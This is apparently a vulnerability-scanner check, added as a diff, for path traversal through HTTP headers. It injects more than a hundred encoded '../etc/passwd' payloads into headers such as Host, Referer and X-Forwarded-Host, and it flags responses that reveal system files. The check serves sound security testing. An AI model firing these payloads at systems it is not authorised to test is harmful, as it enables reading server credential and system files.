@@ -1,0 +1,163 @@
+metadata:
+    language: v2-beta
+    name: "Path Traversal on Header"
+    description: "Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application"
+    author: "j3ssie"
+    tags: "lfi", "path-traversal", "injection"
+
+define:
+    issueDetail = `Path Traversal on Header {latest.request.url}`
+    references = `
+    ## References:
+    - https://portswigger.net/web-security/file-path-traversal
+    - https://book.hacktricks.xyz/pentesting-web/file-inclusion
+    - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html`
+    issueRemediation = `Avoid passing user-supplied input to filesystem APIs altogether
+     {references}`
+
+run for each:
+    injections =
+        `../..//etc/passwd`,
+        `../../..//etc/passwd`,
+        `../../../..//etc/passwd`,
+        `../../../../..//etc/passwd`,
+        `../../../../../..//etc/passwd`,
+        `../../../../../../../..//etc/passwd`,
+        `..%2f/etc/passwd`,
+        `..%2f..%2f/etc/passwd`,
+        `..%2f..%2f..%2f/etc/passwd`,
+        `..%2f..%2f..%2f..%2f/etc/passwd`,
+        `..%2f..%2f..%2f..%2f..%2f/etc/passwd`,
+        `..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd`,
+        `..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd`,
+        `..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd`,
+        `%2e%2e//etc/passwd`,
+        `%2e%2e/%2e%2e//etc/passwd`,
+        `%2e%2e/%2e%2e/%2e%2e//etc/passwd`,
+        `%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`,
+        `%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`,
+        `%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`,
+        `%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`,
+        `%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`,
+        `%2e%2e%2f/etc/passwd`,
+        `%2e%2e%2f%2e%2e%2f/etc/passwd`,
+        `%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd`,
+        `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd`,
+        `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd`,
+        `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd`,
+        `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd`,
+        `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd`,
+        `..%252f/etc/passwd`,
+        `..%252f..%252f/etc/passwd`,
+        `..%252f..%252f..%252f/etc/passwd`,
+        `..%252f..%252f..%252f..%252f/etc/passwd`,
+        `..%252f..%252f..%252f..%252f..%252f/etc/passwd`,
+        `..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd`,
+        `..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd`,
+        `..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd`,
+        `%252e%252e//etc/passwd`,
+        `%252e%252e/%252e%252e//etc/passwd`,
+        `%252e%252e/%252e%252e/%252e%252e//etc/passwd`,
+        `%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd`,
+        `%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd`,
+        `%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd`,
+        `%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd`,
+        `%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd`,
+        `%252e%252e%252f/etc/passwd`,
+        `%252e%252e%252f%252e%252e%252f/etc/passwd`,
+        `%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd`,
+        `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd`,
+        `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd`,
+        `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd`,
+        `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd`,
+        `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd`,
+        `..\/etc/passwd`,
+        `..\..\/etc/passwd`,
+        `..\..\..\/etc/passwd`,
+        `..\..\..\..\/etc/passwd`,
+        `..\..\..\..\..\/etc/passwd`,
+        `..\..\..\..\..\..\/etc/passwd`,
+        `..\..\..\..\..\..\..\/etc/passwd`,
+        `..\..\..\..\..\..\..\..\/etc/passwd`,
+        `..%255c/etc/passwd`,
+        `..%255c..%255c/etc/passwd`,
+        `..%255c..%255c..%255c/etc/passwd`,
+        `..%255c..%255c..%255c..%255c/etc/passwd`,
+        `..%255c..%255c..%255c..%255c..%255c/etc/passwd`,
+        `..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd`,
+        `..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd`,
+        `..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd`,
+        `%252e%252e\/etc/passwd`,
+        `%252e%252e\%252e%252e\/etc/passwd..%5c/etc/passwd`,
+        `..%5c..%5c/etc/passwd`,
+        `..%5c..%5c..%5c/etc/passwd`,
+        `..%5c..%5c..%5c..%5c/etc/passwd`,
+        `..%5c..%5c..%5c..%5c..%5c/etc/passwd`,
+        `..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd`,
+        `..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd`,
+        `..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd`,
+        `%2e%2e\/etc/passwd`,
+        `%2e%2e\%2e%2e\/etc/passwd`,
+        `%2e%2e\%2e%2e\%2e%2e\/etc/passwd`,
+        `%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd`,
+        `%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd`,
+        `%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd`,
+        `%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd`,
+        `%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd`,
+        `%2e%2e%5c/etc/passwd`,
+        `%2e%2e%5c%2e%2e%5c/etc/passwd`,
+        `%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd`,
+        `%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd`,
+        `%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd`,
+        `%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd`,
+        `%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd`,
+        `%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd`,
+        `%252e%252e\%252e%252e\%252e%252e\/etc/passwd`,
+        `%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd`,
+        `%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd`,
+        `%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd`,
+        `%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd`,
+        `%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd`,
+        `%252e%252e%255c/etc/passwd`,
+        `%252e%252e%255c%252e%252e%255c/etc/passwd`,
+        `%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd`,
+        `%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd`,
+        `%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd`,
+        `%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd`,
+        `%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd`,
+        `%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd`
+
+    headerName =
+        "Host",
+        "Referer",
+        "Host",
+        "X-Original-URL",
+        "Profile",
+        "X-Arbitrary",
+        "X-HTTP-DestinationURL",
+        "X-Forwarded-Proto",
+        "Origin",
+        "X-Forwarded-Host",
+        "X-Forwarded-Server",
+        "X-Host",
+        "Proxy-Host",
+        "Destination",
+        "Proxy",
+        "Via"
+
+given request then
+    send request called check:
+        headers:
+            `{headerName}`: `{injections}`
+
+    if {check.response.status_code} is "200" then
+        if ("root:" in {check.response.body} and
+            "bin/" in {check.response.body}) or
+            ("for 16-bit app support" in {check.response.body} or
+            "boot loader" in {check.response.body}) then
+            report issue:
+                severity: high
+                confidence: firm
+                detail: `{issueDetail}`
+        end if
+    end if
